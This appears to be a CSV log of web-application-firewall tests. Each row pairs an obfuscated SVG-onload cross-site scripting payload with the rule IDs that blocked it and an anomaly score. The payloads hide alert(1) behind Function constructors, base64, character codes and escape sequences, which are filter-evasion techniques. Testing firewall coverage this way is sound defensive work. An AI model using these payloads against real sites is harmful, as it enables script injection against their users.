3484,<svg onload=(function(){frames['constructor']['constructor']('ale'+'rt(1)')()})()>,0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o12,69v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o13,11v217,82 || o13,11v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603700768.911578
3486,<svg onload=(function(){Function('wind'+'ow'+'[\x27al'+'ert\x27](1)')()})()>,0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o64,11v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || o13,11v217,76 || o13,11v217,76t:urlDecodeUni || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603701062.650555
3487,<svg onload=(function(){[]['constructor']['constructor']('al'+'ert(1)')()})()>,0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o12,65v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o13,11v217,78 || o13,11v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603701181.480285
3488,<svg/onload=(function(){window['\141\154\145\162\164'](1)})()>,0,1,block,6,"934100,941100,941120,941160,941370,949110","o13,11v217,62 || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,30v217,62t:urlDecodeUni,t:compressWhitespace || ",25,177603701312.715577
3489,<svg	onload=(function(){self['al'+'e'+'rt'](1)})()>,0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o12,38v217,51t:urlDecode,t:replaceComments,t:compressWhitespace || o13,11v217,51 || o13,11v217,51t:urlDecodeUni || v217,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,19v217,51t:urlDecodeUni,t:compressWhitespace || ",35,177603701481.045927
3490,<svg onload=(function(){with(window)al\u0065rt(1)})()>,0,1,block,5,"934100,941100,941120,941160,949110","o13,11v216,54 || v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603701698.608353
3491,"<svg onload=(function(){window['a'+'l'+'e'+'r'+'t']['call'](null,1)})()>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o12,59v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || o13,11v217,72 || o13,11v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,27v217,72t:urlDecodeUni,t:compressWhitespace || ",35,177603701711.205738
3492,<svg onload=(function(){this['ev'+'al']('al'+'ert(1)')})()>,0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o12,46v217,59t:urlDecode,t:replaceComments,t:compressWhitespace || o13,11v217,59 || o13,11v217,59t:urlDecodeUni || v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,59t:urlDecodeUni,t:compressWhitespace || ",35,177603701884.005996
3496,"<svg onload=(function(){Reflect.get(window,String.fromCharCode(0141,0154,0145,0162,0164))(1)})()>",0,1,block,5,"934100,941100,941120,941160,949110","o13,11v217,97 || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603702497.984424
3504,"<svg onload=Function.call(null,'a'+'lert(1)')()>",0,1,block,4,"941100,941120,941160,949110","v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603703568.726331
3505,"<svg onload=Function.apply(null,['a'+'lert(1)'])()>",0,1,block,4,"941100,941120,941160,949110","v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603703649.363091
3507,"<svg onload=window['Function']['call'](null,'a'+'lert(1)')()>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o18,42v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,18v217,61t:urlDecodeUni,t:compressWhitespace || ",25,177603704041.422056
3508,<svg onload=top.Function('a'+'lert(1)').call()>,0,1,block,4,"941100,941120,941160,949110","v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603704193.070626
3512,<svg/onload=Function('a'+'lert(1)')()>,0,1,block,4,"941100,941120,941160,949110","v216,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603704756.495184
3514,<svg onload=Function('ale'+'rt(1)').call(null)>,0,1,block,4,"941100,941120,941160,949110","v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760370501.788783
3521,<svg onload=self['Function']('a\u006cert(1)')()>,0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,31v216,48t:urlDecode,t:replaceComments,t:compressWhitespace || v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v216,48t:urlDecodeUni,t:compressWhitespace || ",25,177603705947.664027
3527,"<svg onload=(0,Function)('a'+String.fromCharCode(108,101,114,116)+'(1)')()>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o29,19v217,75 || o29,19v217,75t:urlDecodeUni || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603706963.686561
3533,<svg onload=self['Function']('a'+'lert'+'(1)')()>,0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,32v216,49t:urlDecode,t:replaceComments,t:compressWhitespace || v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v216,49t:urlDecodeUni,t:compressWhitespace || ",25,177603707786.880731
3534,<svg onload=Function('a\x6cert(1)')()>,0,1,block,4,"941100,941120,941160,949110","v216,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603707857.151527
3547,<svg onload=Function('\u0061'+'lert(1)')()>,0,1,block,4,"941100,941120,941160,949110","v216,43t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,43t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,43t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603709762.871820
3551,<svg onload=globalThis['Function']('al'+'\145rt(1)')()>,0,1,block,5,"933210,941100,941120,941160,949110","o22,32v217,55t:urlDecode,t:replaceComments,t:compressWhitespace || v217,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603710329.676256
3553,<svg onload=top['Function']('ale'+'rt(1)')()>,0,1,block,6,"933210,941100,941120,941160,941370,949110","o15,29v216,45t:urlDecode,t:replaceComments,t:compressWhitespace || v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v216,45t:urlDecodeUni,t:compressWhitespace || ",25,177603710622.122650
3564,<svg onload=globalThis['Function']('ale'+'rt(1)')()>,0,1,block,5,"933210,941100,941120,941160,949110","o22,29v216,52t:urlDecode,t:replaceComments,t:compressWhitespace || v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603712293.093453
3570,"<svg onload=Function('al'.concat(String['fromCharCode'](101),'rt(1)'))()>",0,1,block,5,"933210,941100,941120,941160,949110","o20,52v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603713254.856711
3572,"<svg onload=Function(String.fromCharCode(97,108,101,114,116,40,49,41))()>",0,1,block,5,"934100,941100,941120,941160,949110","o21,19v217,73 || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760371352.952333
3575,"<svg onload=Function(['al','ert','(1)'].join(''))()>",0,1,block,4,"941100,941120,941160,949110","v217,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603713921.074943
3576,<svg/onload=Function('a'+'l'+'e'+'r'+'t'+'(1)')()>,0,1,block,4,"941100,941120,941160,949110","v217,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603714119.457114
3577,"<svg onload=top.Function(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))()>",0,1,block,5,"934100,941100,941120,941160,949110","o25,19v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603714227.394782
3578,"<svg onload=window['Function'](''.concat('al','ert','(1)'))()>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o18,43v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,18v217,62t:urlDecodeUni,t:compressWhitespace || ",25,177603714427.956559
3579,"<svg onload=Function(['al'+'ert(',String.fromCharCode(49),')'].join(''))()>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o34,19v217,75 || o34,19v217,75t:urlDecodeUni || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603714598.250947
3580,<svg onload=globalThis['Function']('al\145rt(1)')()>,0,1,block,5,"933210,941100,941120,941160,949110","o22,29v216,52t:urlDecode,t:replaceComments,t:compressWhitespace || v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603714670.163001
3584,"<svg onload=self['Function']('eval(String.fromCharCode(97,108,101,114,116,40,49,41))')()>",0,1,block,8,"933160,933210,934100,941100,941120,941160,941370,949110","o30,58v217,89 || o16,72v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || o30,5v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v217,89t:urlDecodeUni,t:compressWhitespace || ",35,177603715248.745271
3587,<svg onload=Function(eval(atob('YGFsZXJ0KDEpYA==')))()>,0,1,block,6,"933160,934100,941100,941120,941160,949110","o21,33v216,55 || o21,5v216,55 || v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603715614.536734
3590,<svg/onload=Function('eval'+'(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)')()>,0,1,block,4,"941100,941120,941160,949110","v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603716023.452676
3591,"<svg onload=Function(String.fromCharCode(101,118,97,108,40,96,97,108,101,114,116,40,49,41,96,41))()>",0,1,block,5,"934100,941100,941120,941160,949110","o21,19v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603716290.317209
3592,"<svg onload=Function(['ev','al(`al','ert(1)`)'].join(''))()>",0,1,block,4,"941100,941120,941160,949110","v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603716348.699618
3595,"<svg onload=Function('eval(decodeURI(""%61%6c%65%72%74%28%31%29""))')()>",0,1,block,7,"933160,934100,934100,941100,941120,941160,949110","o22,47v217,70 || o22,5v217,70 || o22,5v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603716714.938846
3599,<svg onload=Function(unescape('%65%76%61%6c%28%60%61%6c%65%72%74%28%31%29%60%29'))()>,0,1,block,5,"934100,941100,941120,941160,949110","o31,5v217,85t:urlDecodeUni || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760371736.390493
3602,"<svg onload=parent['Function']('eval(String.fromCharCode(97)+String.fromCharCode(108,101,114,116,40,49,41))')()>",0,1,block,8,"933160,933210,934100,934100,941100,941120,941160,949110","o32,79v217,112 || o18,93v217,112t:urlDecode,t:replaceComments,t:compressWhitespace || o32,5v217,112 || o32,5v217,112t:urlDecodeUni || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603717739.959383
3634,"<svg onload=setTimeout(Function(atob('YWxlcnQoOCk=')),0)>",0,1,block,4,"941100,941120,941160,949110","v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603722351.805899
3636,"<svg onload=setInterval(Function(atob('YWxlcnQoOCk=')),0)>",0,1,block,4,"941100,941120,941160,949110","v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603722693.790648
3637,"<svg onload=new&#32;Function('setTime'+'out(atob(""YWxlcnQoOCk=""),0)')()>",0,1,block,4,"941100,941120,941160,949110","v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603722723.791787
3638,"<svg/onload=Function('setTime'+'out(atob(""YWxlcnQoOCk=""),0)')()>",0,1,block,4,"941100,941120,941160,949110","v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603722843.350037
3644,"<svg onload=top['Function'](String.fromCharCode(97,108,101,114,116,40,49,41))()>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o15,64v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o28,19v217,80 || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,80t:urlDecodeUni,t:compressWhitespace || ",30,177603723720.007254
3649,"<svg/onload=Function(String.fromCharCode(97,108,101,114,116,40,49,41))()>",0,1,block,5,"934100,941100,941120,941160,949110","o21,19v217,73 || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603724460.318942
3656,"<svg onload=parent['Function'](String.fromCharCode(97,108,101,114,116,40,49,41))()>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o18,64v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o31,19v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603725396.165835
3657,"<svg onload=Function(String['fromCharCode'](97,108,101,114,116,40,49,41))()>",0,1,block,5,"933210,941100,941120,941160,949110","o20,55v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603725555.880891
3662,<svg onload=top['Function'](atob('YWxlcnQoMSk='))()>,0,1,block,6,"933210,941100,941120,941160,941370,949110","o15,36v216,52t:urlDecode,t:replaceComments,t:compressWhitespace || v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v216,52t:urlDecodeUni,t:compressWhitespace || ",25,177603726321.294714
3666,<svg onload=parent['Function'](atob('YWxlcnQoMSk='))()>,0,1,block,5,"933210,941100,941120,941160,949110","o18,36v216,55t:urlDecode,t:replaceComments,t:compressWhitespace || v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760372681.285992
